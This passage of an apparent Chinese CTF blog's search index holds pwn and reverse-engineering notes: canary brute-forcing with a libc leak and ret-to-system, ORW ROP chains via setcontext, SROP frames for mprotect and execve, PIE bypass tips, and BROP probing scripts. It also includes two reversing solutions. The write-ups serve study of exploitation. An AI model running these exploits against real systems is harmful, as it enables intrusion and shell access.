0x100u);\n```\n\n2.由于canary的关系，栈溢出没办法利用，但是这里可以通过格式化字符串漏洞直接泄露canary，之后再实际操作。这里为了学习爆破canary的方式，先用爆破的方式来获取canary。\n\n3.如果直接爆破canary，由于canary随机刷新，就算去掉最后一个字节\\x00，在32位条件下我们假定一个canary的值，那么canary随机生成为我们假定的值的概率应该为1/(2^24-1)所以从概率上讲应该需要爆破2^24-1次，也就是16,777,215-1次，而且还只是概率上的期望值，如果不考虑canary的实际生成机制，并且运气不好的话，可能无穷大，等爆出来黄花菜都凉了，这鬼能接受。所以一般使用爆破canary都需要一个fork子进程。\n\n4.子进程的崩溃并不会影响到父进程，并且由于子进程的数据都是从父进程复制过来的，canary也一样，只要父进程不结束，子进程无论崩溃多少次其初始化的数据还是父进程的数据，canary就不会发生改变，这样就为快速爆破canary创造了前提。刚好这个程序有fork一个子进程：\n\n(1)观察汇编代码：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191522904.png)\n\nmain函数主体中先call fork，由于函数的结果基本都是传给eax，所以这里的eax就代表fork的成功与否，返回ID代表fork成功，然后将调用结果赋值给局部变量[esp+1ch]，之后拿0与局部变量[esp+1ch]比较。这里涉及到JNZ影响的标志位ZF，CF等，不细介绍。总而言之就是会fork一个子进程，成功就跳转到我们之前说过的有漏洞的函数中，失败则等待，一会然后依据while重开程序。\n\n(2)观察伪代码也可以\n\n▲fork机制：\n\n1）在父进程中，fork返回新创建子进程的进程ID；\n\n2）在子进程中，fork返回0；\n\n3）如果出现错误，fork返回一个负值；\n\n5.爆破canary原理：\n\n(1)最开始我认为就算canary不变，那么从0*24开始尝试，一直到canary的值，那么需要尝试canary值这么多次，最少1次，最多2^24次，就算取期望，那也应该是(1/2)*(2^24)次。也没办法接受啊。\n\n(2)之后看了canary的检查机制和生成机制：在sub_80487FA汇编代码中：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191522748.png)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191522426.png)\n\n生成的时候是将栈上指定地方[ebp+var_C]给修改成canary。\n\n检查的时候，是从栈上取[ebp+var_C]的值传给eax和最开始随机生成的canary(large gs:14h)来比较，所以当我们用栈溢出的时候，我们可以只溢出一个字节来修改[ebp+var_C]的第1个字节，(第0个字节是\\x00)，然后启动检查机制。由于只修改了栈上[ebp+var_C]的第1个字节数据，第3,2个字节仍然还是之前被保存的canary的值。所以我们获取第1个字节需要尝试最少1次，最多2^8次，平均(1/2)*(2^8)次，也就是128次，可以接受。之后将爆破成功的第1个字节加到栈溢出内容中，再溢出一个字节修改[ebp+var_C]上的第2个字节，同理，完成爆破需要128次，总的来说平均需要128*3=384次，完全可以接受。\n\n(3)爆破一般形式程序，两个循环：\n\n```\n#注释头\n\nfor i in xrange(3):\nfor j in xrange(256):\n```\n\n6.之后不同程序不太一样，有的程序没有循环，是直接fork一个子进程，监听其它端口，这时候只要连接该端口就可以进行爆破，失败了关闭端口就是。\n\n有的程序只是在程序中fork一个子进程，但是有循环，那么我们就需要在循环里跑出来canary。然后直接进行下一步payload，不然断开连接的话，程序又重新生成canary，等于没用。\n\n7.总结一下，程序最开始需要输入Y，然后跳转到有漏洞的函数sub_80487FA中，之后可以获取输入name，这里的输入的name在下一条[*] Welcome to the game之后会被打印出来，并且打印的方式存在格式化字符串漏洞。所以可以通过调试，输入%p来获取栈上的指定的libc地址内容，泄露libc从而获取libc基地址。\n\n8.由于每次子程序崩溃后都会从头开始，都需要再输入Y和name，那么直接将该段泄露代码放在爆破循环中即可：\n\n```\ncanary = '\\x00'\nfor i in xrange(3):\n    for j in xrange(256):\n        io.sendline('Y')\n        io.recv()\n        io.sendline('%19$p') #泄露栈上的libc地址\n        io.recvuntil('game ')\n        leak_libc_addr = int(io.recv(10), 16)\n\n        io.recv()\n        payload = 'A'*16 #构造payload爆破canary\n        payload += canary\n        payload += chr(j)\n        io.send(payload)\n        io.recv()\n        if (\"\" != io.recv(timeout = 0.1)): \n        #如果canary的字节位爆破正确，应该输出两个\"[*] Do you love me?\"，因此通过第二个recv的结果判断是否成功\n            canary += chr(j)\n            log.info('At round %d find canary byte %#x' %(i, j))\n            break\n```\n\n \n\n9.爆破结束后，得到libc基地址，canary，以及一个可以利用的栈溢出，程序循环从最开始。那么利用栈溢出返回到system函数，由于32位程序，栈传参，那么可以提前布置好栈，使得system函数直接从我们布置的栈上读取binsh字符串，直接getshell。\n\n```\n#注释头\n\nlog.info('Canary is %#x' %(u32(canary)))\nsystem_addr = leak_libc_addr - 0x2ed3b + 0x3b060\nbinsh_addr = leak_libc_addr - 0x2ed3b + 0x15fa0f\nlog.info('System_address:%#x,binsh_addr:%#x'%(system_addr,binsh_addr))\n\npayload = ''\npayload += 'A'*16\npayload += canary\npayload += 'B'*12\npayload += p32(system_addr)\npayload += 'CCCC'\npayload += p32(binsh_addr)\n\nio.sendline('Y') #[*] Do you love me?\nio.recv()\nio.sendline('1') #[*] Input Your name please: 随便一个输入\nio.recv()\nio.send(payload) #[*] Input Your Id: 漏洞产生点\nio.interactive()\n```\n\n \n\n参考资料：\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n\n","tags":["canary"],"categories":["PWN","canary绕过0x9"]},{"title":"ORW汇总","url":"/2021/08/19/ORW汇总/","content":"\n1.seccomp保护：\n\n(1)工具安装：\n\n```\n#注释头\n\nsudo apt install gcc ruby-dev\ngem install seccomp-tools\n```\n\n(2)查看保护：\n\nseccomp-tools dump ./pwn\n\n```\n#注释头\n\nroot@241adce81c0a:/ctf/CISCN/silverwolf# seccomp-tools dump ./silverwolf\nline CODE JT JF K\n=================================\n0000: 0x20 0x00 0x00 0x00000004 A = arch\n0001: 0x15 0x00 0x07 0xc000003e if (A != ARCH_X86_64) goto 0009\n0002: 0x20 0x00 0x00 0x00000000 A = sys_number\n0003: 0x35 0x00 0x01 0x40000000 if (A < 0x40000000) goto 0005\n0004: 0x15 0x00 0x04 0xffffffff if (A != 0xffffffff) goto 0009\n0005: 0x15 0x02 0x00 0x00000000 if (A == read) goto 0008\n0006: 0x15 0x01 0x00 0x00000001 if (A == write) goto 0008\n0007: 0x15 0x00 0x01 0x00000002 if (A != open) goto 0009\n0008: 0x06 0x00 0x00 0x7fff0000 return ALLOW\n0009: 0x06 0x00 0x00 0x00000000 return KILL\n```\n\n(3)解析：\n\n如上，如果架构不为ARCH_X86_64，则to 0009(kill)。系统调用号A为read,write，则to 0008，即ALLOW。同理看懂if语句就行，这里只能用read和write，照理说open也可以，但是这里好像不太行。\n\n2.setcontext不同版本：\n\n(1)2.29以前：劫持 free_hook 或者 malloc_hook写入 setcontext函数中的 gadget( setcontext+53)，通过 rdi索引，来设置相关寄存器：\n\n```\n#注释头\n\n<setcontext+53>: mov rsp,QWORD PTR [rdi+0xa0]\n<setcontext+60>: mov rbx,QWORD PTR [rdi+0x80]\n<setcontext+67>: mov rbp,QWORD PTR [rdi+0x78]\n<setcontext+71>: mov r12,QWORD PTR [rdi+0x48]\n<setcontext+75>: mov r13,QWORD PTR [rdi+0x50]\n<setcontext+79>: mov r14,QWORD PTR [rdi+0x58]\n<setcontext+83>: mov r15,QWORD PTR [rdi+0x60]\n<setcontext+87>: mov rcx,QWORD PTR [rdi+0xa8]\n<setcontext+94>: push rcx\n<setcontext+95>: mov rsi,QWORD PTR [rdi+0x70]\n<setcontext+99>: mov rdx,QWORD PTR [rdi+0x88]\n<setcontext+106>: mov rcx,QWORD PTR [rdi+0x98]\n<setcontext+113>: mov r8,QWORD PTR [rdi+0x28]\n<setcontext+117>: mov r9,QWORD PTR [rdi+0x30]\n<setcontext+121>: mov rdi,QWORD PTR [rdi+0x68]\n<setcontext+125>: xor eax,eax\n<setcontext+127>: ret\n```\n\n并执行提前布置好的 ORW ROP chains。\n\n△如果是free_hook则将对应要释放的堆块的内容改为ORW ROP chains即可。如果是malloc_hook，不太知道，应该也是在对应堆块改ORW ROP chains，但是需要这个堆块确实是这一次malloc出来的堆块吧。\n\n(2)2.29后 setcontext中的gadget变成了以 rdx索引，因此如果我们按照之前思路的话，需要通过 ROP控制 RDX的值，如下所示：\n\n```\n#注释头\n\n.text:00000000000580DD mov rsp, [rdx+0A0h]\n.text:00000000000580E4 mov rbx, [rdx+80h]\n.text:00000000000580EB mov rbp, [rdx+78h]\n.text:00000000000580EF mov r12, [rdx+48h]\n.text:00000000000580F3 mov r13, [rdx+50h]\n.text:00000000000580F7 mov r14, [rdx+58h]\n.text:00000000000580FB mov r15, [rdx+60h]\n.text:00000000000580FF test dword ptr fs:48h, 2\n....\n.text:00000000000581C6 mov rcx, [rdx+0A8h]\n.text:00000000000581CD push rcx\n.text:00000000000581CE mov rsi, [rdx+70h]\n.text:00000000000581D2 mov rdi, [rdx+68h]\n.text:00000000000581D6 mov rcx, [rdx+98h]\n.text:00000000000581DD mov r8, [rdx+28h]\n.text:00000000000581E1 mov r9, [rdx+30h]\n.text:00000000000581E5 mov rdx, [rdx+88h]\n.text:00000000000581EC xor eax, eax\n.text:00000000000581EE retn\n```\n\n这里好像赋值的索引好像有点变化，所以可能实际做题的时候需要变一下脚本。同时setcontext+53变成了setcontext+61然后由于rdx的gadget可能不是太好找，所以一般有以下几个好用的gadget：\n\n①getkeyserv_handle+576：\n\n```\n#注释头\n\nmov rdx, [rdi+8]\nmov [rsp+0C8h+var_C8], rax\ncall qword ptr [rdx+20h]\n```\n\n通过rdi控制rdx，同样2.29以后不同版本都不太一样，需要再调试看看，比如2.31里就是：\n\n```\n#注释头\n\nmov rdx,QWORD PTR [rdi+0x8]\nmov QWORD PTR [rsp],rax\ncall QWORD PTR [rdx+0x20]\n```\n\n②svcudp_reply+26:\n\n```\n#注释头\n\nmov rbp, qword ptr [rdi + 0x48]; \nmov rax, qword ptr [rbp + 0x18]; \nlea r13, [rbp + 0x10]; \nmov dword ptr [rbp + 0x10], 0; \nmov rdi, r13; \ncall qword ptr [rax + 0x28];\n```\n\n通过rdi控制rbp实现栈迁移，然后即可任意gadget了。\n\n其中2.31版本下还是一样的，如下：\n\n```\n#注释头\n\nmov rbp,QWORD PTR [rdi+0x48]\nmov rax,QWORD PTR [rbp+0x18]\nlea r13,[rbp+0x10]\nmov DWORD PTR [rbp+0x10],0x0\nmov rdi,r13\ncall QWORD PTR [rax+0x28]\n```\n\n③万能gadget，不知道为什么https://www.anquanke.com/post/id/236832#h3-10这篇文章没有提及到万能gadget，不过我觉得应该也能用，不过使用万能gadget的话一般还需要配合栈迁移才行。\n\n④通过environ泄露栈地址，并在栈上构造orw rop链。(libc的bss偏移，然后io_file)\n\n \n\n3.常用orw chains脚本：\n\n(1)利用open、write、read：\n\nCISCN-2021 silverwolf\n\n```\n#注释头\n\n#直接改__free_hook为setcontext+53\n#2.28 and down\n\nchunk_addr = heap_addr +0x2e0\nfake_rsp = chunk_addr + 0xb0 + 0x10\nflag = chunk_addr + 0xb0\n\norw = \"a\"*0xa0\n\norw += p64(fake_rsp)+p64(ret)\norw += './flag\\x00\\x00'\norw += p64(0)\norw += p64(pop_rdi_ret) + p64(flag)\norw += p64(pop_rsi_ret) + p64(0)\norw += p64(pop_rax_ret) + p64(2)\norw += p64(syscall_ret)\norw += p64(pop_rdi_ret) + p64(3)\norw += p64(pop_rsi_ret) + p64(fake_rsp+0x200)\norw += p64(pop_rdx_ret) + p64(0x30)\norw += p64(libc_base+libc.sym['read'])\norw += p64(pop_rdi_ret) + p64(1)\norw += p64(libc_base+libc.sym['write'])\n```\n\n2019-BALSN-CTF-plaintext\n\n```\n#注释头\n\n#2.29,需要将__free_hook设置为指定gadget，这里为__libc_cleanup_routine+7\nmov rdx, qword ptr [rdi + 8]\nmov rax, qword ptr [rdi]\nmov rdi, rdx\njmp rax\n#不同gadget脚本需要微调，只要满足赋值rdi并且之后跳转到setcontext即可\n#需要从\"a\"*0xa0中拿出0x10的空间用来设置setcontext,然后将rdx赋值为对应chunk地址\n\nchunk_addr = heap_addr +0x30a0\nfake_rsp = chunk_addr + 0xb0 + 0x10\nflag = chunk_addr + 0xb0\n\n#这里setcontext+0x1d或53都可以，具体调试分析,但是61不行\n#即chunk_addr+0x8赋值为chunk_addr，chunk_addr赋值为setcontext+0x1d\norw = p64(libc_addr + libc.symbols['setcontext'] + 0x1d) + p64(chunk_addr) \norw += \"a\"*0x90\n\norw += p64(fake_rsp) + p64(ret)\norw += './flag\\x00\\x00'\norw += p64(0)\norw += p64(pop_rdi_ret) + p64(flag)\norw += p64(pop_rsi_ret) + p64(0)\norw += p64(pop_rax_ret) + p64(2)\norw += p64(syscall_ret)\norw += p64(pop_rdi_ret) + p64(3)\norw += p64(pop_rsi_ret) + p64(fake_rsp+0x200)\norw += p64(pop_rdx_ret) + p64(0x30)\norw += p64(libc_base+libc.sym['read'])\norw += p64(pop_rdi_ret) + p64(1)\norw += p64(libc_base+libc.sym['write'])\n```\n\nYCB easy_heap\n\n```\n#注释头 \n#2.31 \n#这里同样将free_hook设置为gadget，用到的是getkeyserv_handle+576： \nmov rdx, [rdi+8] \nmov [rsp+0C8h+var_C8], rax \ncall qword ptr [rdx+20h] \n\n#chunk_addr+8赋值为chunk_addr，chunk_addr+0x20赋值为setcontext+61\nchunk_addr = heap_addr +0x20\nfake_rsp = chunk_addr + 0xb0 + 0x10\nflag = chunk_addr + 0xb0 \n\norw = \"a\"*0x08 + p64(chunk_addr) \norw += \"a\"*0x10 \norw += p64(libc_addr + libc.sym['setcontext'] + 61) + \"a\"*0x8\norw += \"a\"*0x70\n\norw += p64(fake_rsp) + p64(ret)\norw += './flag\\x00\\x00'\norw += p64(0)\norw += p64(pop_rdi_ret) + p64(flag)\norw += p64(pop_rsi_ret) + p64(0)\norw += p64(pop_rax_ret) + p64(2)\norw += p64(syscall_ret)\norw += p64(pop_rdi_ret) + p64(3)\norw += p64(pop_rsi_ret) + p64(fake_rsp+0x200)\norw += p64(pop_rdx_ret) + p64(0x30)\norw += p64(libc_base+libc.sym['read'])\norw += p64(pop_rdi_ret) + p64(1)\norw += p64(libc_base+libc.sym['write'])\n```\n\n▲同样可以用frame结构体来调用函数。\n","tags":["ORW-Skill"],"categories":["ORW"]},{"title":"PIE绕过总结","url":"/2021/08/19/PIE绕过总结/","content":"\n1.利用PIE机制，爆破倒数第四位可以跳转到同一个内存页中的任意函数。\n\n2.利用栈溢出和打印函数的参数，修改劫持rbp使得利用rbp寻址的打印函数的参数指向栈上其它位置，通过爆破来寻求泄露Libc地址。\n\n3.利用vsyscall或者vdso来滑过一段栈空间，从而将eip挪移到栈底下方我们想要的地址处。\n\n","tags":["PIE"],"categories":["PWN","PIE0x7"]},{"title":"SROP总结","url":"/2021/08/19/SROP总结/","content":"\n一、SROP调用的结构体，在sigcontext.h中有定义：\n\n1.32位程序：\n\n(1)总长度共计：\n\n(2)调用：\n\n```\n#注释头\n\nA.32位系统上运行32位程序：\ncontext.arch = 'i386'\nSigreturnFrame(kernel = 'i386')\n\nB.64位系统上运行32位程序：\ncontext.arch = 'i386'\nSigreturnFrame(kernel = 'amd64')\n```\n\n2.64位程序：\n\n(1)总长共计：0xf8\n\n(2)调用：\n\n```\n#注释头\n\ncontext.arch = ‘amd64’\nSigreturnFrame(kernel = ‘amd64’)\n```\n\n \n\n二、pwn中使用：\n\n1.首先定义：\n\nframe_func = SigreturnFrame()\n\n2.之后设置寄存器：\n\n```\n#注释头\n\nframe_func.rax = constants.SYS_func\nframe_func.rdi/rsi/......\nframe_func.rsp = stack_addr\n#栈劫持一般可以用到，即当SROP运行完之后，栈顶就会跳转到设置的rsp处，没设置则默认为0\nframe_func.rip = syscall_addr\n#这里通过rax和rip配合调用任意系统函数，其它寄存器就是用来设置参数的)\n```\n\n3.使用条件：\n\n(1)没有sigreturn gadget指针时，利用syscall来调用：\n\n①64位需要系统调用号rax = 0xf。32位需要系统调用号rax = 0x4d\n\n(这个一般可以通过read函数来实现，修改rax)\n\n②进入时需要执行syscall，栈顶rsp指向frame_func结构体头部。\n\n(2)有sigreturn指针时：\n\n直接覆盖返回地址为sigreturn gadget，然后该返回地址下方的栈上覆盖frame_func结构体。\n\n \n\n三、常用功能：\n\n1.read：\n\n```\n#注释头\n\nframe_read = SigreturnFrame() #设置read的SROP帧\nframe_read.rax = constants.SYS_read\nframe_read.rdi = 0\nframe_read.rsi = stack_addr\nframe_read.rdx = 0x300\nframe_read.rip = syscall_addr\n```\n\n2.利用mprotect修改内存RWX权限：\n\n```\n#注释头\n\nframe_mprotect = SigreturnFrame()\n#设置mprotect的SROP帧，用mprotect修改栈内存为RWX\nframe_mprotect.rax = constants.SYS_mprotect\nframe_mprotect.rdi = stack_addr & 0xFFFFFFFFFFFFF000\nframe_mprotect.rsi = 0x1000\nframe_mprotect.rdx = constants.PROT_READ | constants.PROT_WRITE | constants.PROT_EXEC\nframe_mprotect.rsp = stack_addr\nframe_mprotect.rip = syscall_addr\n```\n\n3.getshell:\n\n```\n#注释头\n\nframe_execve = SigreturnFrame()\nframe_execve.rax = constants.SYS_execve\nframe_execve.rdi = stack_addr+0x108\n#这是binsh字符串的地址\nframe_execve.rip = syscall_addr\n```\n\n \n\n四、结构体 in /usr/include/bits/sigcontext.h：\n\n```\n#注释头  0xf8\n\nstruct sigcontext\n{\n__uint64_t r8;\n__uint64_t r9;\n__uint64_t r10;\n__uint64_t r11;\n__uint64_t r12;\n__uint64_t r13;\n__uint64_t r14;\n__uint64_t r15;\n__uint64_t rdi;\n__uint64_t rsi;\n__uint64_t rbp;\n__uint64_t rbx;\n__uint64_t rdx;\n__uint64_t rax;\n__uint64_t rcx;\n__uint64_t rsp;\n__uint64_t rip;\n__uint64_t eflags;\nunsigned short cs;\nunsigned short gs;\nunsigned short fs;\nunsigned short __pad0;\n__uint64_t err;\n__uint64_t trapno;\n__uint64_t oldmask;\n__uint64_t cr2;\n__extension__ union\n{\nstruct _fpstate * fpstate;\n__uint64_t __fpstate_word;\n};\n__uint64_t __reserved1 [8];\n};\n```\n\n \n\n```\n#注释头    0x50\n\nstruct sigcontext\n{\nunsigned short gs, __gsh;\nunsigned short fs, __fsh;\nunsigned short es, __esh;\nunsigned short ds, __dsh;\nunsigned long edi;\nunsigned long esi;\nunsigned long ebp;\nunsigned long esp;\nunsigned long ebx;\nunsigned long edx;\nunsigned long ecx;\nunsigned long eax;\nunsigned long trapno;\nunsigned long err;\nunsigned long eip;\nunsigned short cs, __csh;\nunsigned long eflags;\nunsigned long esp_at_signal;\nunsigned short ss, __ssh;\nstruct _fpstate * fpstate;\nunsigned long oldmask;\nunsigned long cr2;\n};\n```\n\n实际大小最好对应版本再调试\n","tags":["SROP"],"categories":["PWN","SROP0x8"]},{"title":"X-CTF-maze","url":"/2021/08/19/X-CTF-maze/","content":"\n文件地址：https://github.com/PIG-007/X-CTF\n\n 1.拖入exeinfope.exe查看版本位数，64位，载入IDA.\n\n2.由于题目maze的提示，还有函数中一直出现的8，再加上判断语句中\n\nasc_601060[8 * (signed int)v9 + SHIDWORD(v9)] != '#'\n\n以及字符串：\n\n“  *******  *  **** * ****  * ***  *#  *** *** ***   *********”\n\n可知是走迷宫题目，也就是将该字符串以8位为一个行，形成一个8*8的迷宫：\n\n![https://adworld.xctf.org.cn/media/task/writeup/cn/maze/10.png](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191557487.png)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191557287.jpeg)\n\n按照1的路径一直走，共走18步。\n\n3.然后再仔细分析，在linux中运行，需要输入flag，再在IDA中发现有输入长度要求，得是nctf{xxxxx(18个)}这种形式。然后分析迷宫，发现取最短路径走到#刚好是18个。\n\n4.现在开始寻找方向：很容易发现四个if语句：（这里得右键对应的数字-R转成字符形式，才能看到对应数字的ascii码）\n\nif ( v4 == 'O' )\n\nif ( v4 == 'o' )\n\nif ( v4 == '.' )\n\nif ( v4 == '0' )\n\n这个应该就是代表上下左右了，那么现在还得判断究竟是哪个代表哪个。这里有两种方法。一是接着看代码，进去里面仔细分析，可以推出。二是通过远程调试来判断。\n\n▲方法一：我们进入到四个if语句中的每个函数中看看，有类似如下语句：\n\nv1 = (*a1)--;\n\nv1 = *a1 + 1;\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191557346.jpeg)![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191557285.jpeg)\n\n传入的值分别是：&v10+4,和&v10，这里不同的IDA反汇编出来的参数不一样，但看v10的类型是一个int型的指针，4个字节为一个int，&v10+4代表int指针往下拨动一个int，也就是常说的指针+1，有的时候IDA也会反汇编为&v10+1，这是代表的是&(V10+1)也是一样的，只是括号没有写出来。这里我们可以将鼠标移动到变量上，按下Y快捷键，输入int[2]来修改，之后再按N快捷键修改变量名称为direction，最终变成\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191557350.jpeg)\n\n这样就清晰多了，至于为什么要int[2]，因为迷宫都是二维的，一般可用x0y坐标轴来表示，这样我们就可将direction[1]l来代表x轴，direction代表y轴，反之亦然。如下：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191557351.jpeg)\n\n那么就是O和o代表x轴左右，0和.代表y轴上下或者反过来，则flag就有两种，都列举出来提交试试就可以得到正确答案。\n\n▲尝试第二种方法，远程linux下调试：这里还需要看看接下来的代码：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191557829.jpeg)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191557885.jpeg)\n\n所有方向判断语句之后都会跳转到LABEL_14，由此可以断定得是判断正确才会break来使得label20不被运行，从而跳出打印错误flag的语句，所以这里需要使得v6=1，然后再向上找找，有这样的语句：\n\n而v7又是方向判断函数的返回值，所以在运行时可以尝试看v7的值来判断输入的正确与否。于是在该处下断点，或者对应汇编代码中：mov bpl, al。(鼠标放在v7上，显示al，说明v7是存放在al这个变量上的)，尝试性输入nctf{000000000000000000}，输入够了就行，然后在运行中看v7，也就是al的值，如果被赋值为1，则0就代表向右，因为我们迷宫中第一步就是向右的，否则就换下一个试。依次类推，可以通过调试来摸清方向。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191557962.jpeg)\n\n断点停住，查看al的值为1，本来应该说明0代表向右，但是如果输入\n\nnctf{oooooooooooooooooo}，al的值也是1。这里是因为右和下都能走，但是源代码中还有一个判断逻辑：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191557966.jpeg)\n\n代表撞墙逻辑，也就是如果撞墙上了，仍然会打印错误Flag。查看迷宫，发现向下会撞墙上，而对应nctf{oooooooooooooooooo}调试的时候，接着单步执行，会发现程序再一次进入方向判断函数，并没有直接进入撞墙的逻辑中，说明nctf{oooooooooooooooooo}的第一个才是右，而nctf{000000000000000000}会撞墙上，虽然v7的值是1，但仍然会导致错误。所以0代表下，o代表右，依次类推就可以判断出方向。\n\n最终flag为：nctf{o0oo00O000oooo..OO}\n\n(Linux远程调试可以看其它文章)\n\n \n\n \n\n \n","tags":["First"],"categories":["REVERSE"]},{"title":"X-CTF-no_string","url":"/2021/08/19/X-CTF-no_string/","content":"\n文件地址：https://github.com/PIG-007/X-CTF\n\n1.  这是一个linux程序，先在Linux环境下跑一下，输出两串没用字符，其中一个是显示错误信息，不过这也代表了应该要输入东西之后，显示正确，然后打印flag，或者直接输入flag，打印正确。\n2. 载入IDA，发现关键函数在authenticate()中的decrypt()，函数decrypt()进行一堆算法，然后赋值给s2，再将s2与输入的字符串作比较，一样就打印成功，但是不打印其它字符串。这里就可以判定我们应该是得输入flag，然后程序判断后打印成功。那么我们需要的flag就应该在s2中。这里就可以分两种方法来获取flag。\n\n★第一种：让程序跑起来，然后查看s2所在寄存器的的值\n\n(1)打开linux的虚拟环境，打开终端，输入gdb no_string，开始使用gdb载入程序。\n\n(2)输入命令b decrypt，表示在该函数处下断点，之后输入r让程序运行至断点处停止。\n\n(3)这时候因为程序是停在decrypt这个函数上，并没有执行该函数，所以应该输入n来使得程序进行一步，运行该函数。\n\n(4)此时eax寄存器中应该保存着s2，也就是我们需要的flag的值，所以输入命令：x/200wx$eax 来获取eax寄存器中的值：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191557048.jpeg)\n\n从0x00000039一直到字符串结尾字符标志0x00000000，也就是对应flag的值，大家直接黏贴出来转ascii码就行。\n\n▲200是代表查看多少个，wx是代表以word字节查看，$eax即是查看该寄存器的值。\n\n(另外：可以通过IDApython来打印，也就是先在linux下远程动态调试，将断点停在decrypt上，然后运行一步，在右上角寄存器窗口栏右键eax-在数据窗口跟随，找到eax的首地址，运行如下py代码：\n\n```\n#注释头\naddr=0x0965D800#eax首地址，或者点击eax首地址，然后换成here()\nans=\"\"\nfor temp addr in range(addr,addr+50*4,4):\n    ans+=get_bytes(tempaddr,1)\nprint(ans)\n```\n\n \n\n这里addr+50*4代表从addr开始偏移量为50*4，因为可以看到eax中每四个字节存 储一个字符数据，也就是向下读取50个字符，然后后面的4是以4个字节为一个单位来翻译字符)\n\n★第二种：\n\n(1)在IDA中查看传入decrypt的两个数据，可以用Py脚本打印或者是点进去，然后选中整个数据段之后shift+E，可以转换为C类型或者是hex类型可得。\n\n(2)然后编写逆推算法：利用十六进制来表示。\n","tags":["First"],"categories":["REVERSE"]},{"title":"hctf2016-brop","url":"/2021/08/19/hctf2016-brop/","content":"\n1.题目用以下代码编译和搭建，[brop.c]就是程序代码文件\n\n```\n#注释头\n\ngcc -z noexecstack -fno-stack-protector -no-pie brop.c -o brop\nsocat tcp-listen:10001,fork exec:./brop,reuseaddr &\n```\n\n2.程序不打印我们的输入，并且输入多个%p没什么反应，那么应该就不是格式化字符串盲打，尝试栈溢出行不行，使用脚本爆破一下：\n\n```\n#注释头\n\ndef getbufferflow_length():\n    i = 1\n    while 1:\n        try:\n            sh = remote('127.0.0.1', 10001)\n            sh.recvuntil('WelCome my friend,Do you know password?\\n ')\n            sh.send(i * 'a')\n            output = sh.recv()\n            sh.close()\n            if not output.startswith('No password'):\n                return i - 1\n            else:\n                i += 1\n        except EOFError:\n            sh.close()\n            return i - 1\n\nbuf_size = getbufferflow_length()\nlog.info(\"buf_size:%d\"%buf_size)\n```\n\n不断尝试，如果没有接收到“No password”那就代表程序出错，栈溢出覆盖到了返回地址，这时候就退出，其它错误也退出。最后爆破出来为72个字节，那么buf的缓冲区就是72-8(rbp)=64个字节。(总感觉这里有点问题，如果真是blind，那么肯定也不知道是32位还是64位啊，那么就应该两种方案都要尝试一下吧)\n\n3.寻找可以使得程序挂起的stop_gadget。这个stop_gadget是什么不重要，只要能让程序不崩溃，能够在之后探索其它可以rop的时候接收到正确的反馈，那么是什么都可以。\n\n```\n#注释头\n\ndef get_stop_addr(buf_size):\n    addr = 0x400000\n    while True:\n        sleep(0.1)#缓冲\n        addr += 1\n        payload = \"A\"*buf_size\n        payload += p64(addr)#probe_addr\n        try:\n            sh = remote('127.0.0.1', 10001)\n            sh.recvline()\n            sh.sendline(payload)\n            sh.recvline()\n            sh.close()\n            log.info(\"stop address: 0x%x\" % addr)\n            return addr\n        except EOFError as e:#crash and restart\n            sh.close()\n            log.info(\"bad: 0x%x\" % addr)\n        except:#other error\n            log.info(\"Can't connect\")\n            addr -= 1\n```\n\n4.得到stop_addr之后，就可以继续探索其它的rop_gadget，这里寻找万能gadget的六个pop的地方：\n\n```\n#注释头\n\ndef get_gadgets_addr(buf_size, stop_addr):\n    addr = stop_addr\n    while True:\n        sleep(0.1)\n        addr += 1\n        payload = \"A\"*buf_size\n        payload += p64(addr)\n        payload += p64(1) + p64(2) + p64(3) + p64(4) + p64(5) +\n        p64(6)\n        payload += p64(stop_addr)\n        try:\n            p = remote('127.0.0.1', 10001)\n            p.recvline()\n            p.sendline(payload)\n            p.recvline()\n            p.close()\n            log.info(\"find address: 0x%x\" % addr)\n            try: # check\n                payload = \"A\"*buf_size\n                payload += p64(addr)\n                payload += p64(1) + p64(2) + p64(3) + p64(4) + p\n                64(5) + p64(6)\n                #Six pop without stop_addr\n                p = remote('127.0.0.1', 10001)\n                p.recvline()\n                p.sendline(payload)\n                p.recvline()\n                p.close()\n                log.info(\"bad address: 0x%x\" % addr)\n                #Not crash,Bad addr.\n            except:#Crash,success addr\n                p.close()\n                log.info(\"gadget address: 0x%x\" % addr)\n                return addr\n        except EOFError as e:\n            p.close()\n            log.info(\"bad: 0x%x\" % addr)\n        except:\n            log.info(\"Can't connect\")\n            addr -= 1\n```\n\n找到之后，需要再次检查一下，用来确定是不是万能gadget，因为如果有程序六个pop之后不retn，那就不是万能gadget。因为需要dump二进制文件，所以需要万能gadget中的Pop rdi;ret 这个gadget来dump文件。\n\n5.寻找puts函数的plt表，方便之后调用puts函数和pop rdi;ret这个gadget来dump二进制文件。\n\n```\n#注释头\n\ndef get_puts_addr(buf_size, rdi_ret, stop_gadget):\n    addr = 0x400000\n    while 1:\n        print hex(addr)\n        sh = remote('127.0.0.1', 10001)\n        sh.recvuntil('password?\\n')\n        payload = 'A' * buf_size + p64(rdi_ret) + p64(0x400000) + p64(addr) + p64(stop_gadget)\n        #call put to print the head of ELF.\n        sh.sendline(payload)\n        try:\n            content = sh.recv()\n            if content.startswith('\\x7fELF'):\n                print(\"find puts@plt addr: 0x%x\"%addr)\n                return addr\n            sh.close()\n            addr += 1\n        except EOFError as e:\n            sh.close()\n            log.info(\"bad: 0x%x\" % addr)\n        except:\n            log.info(\"Can't connect\")\n            addr -= 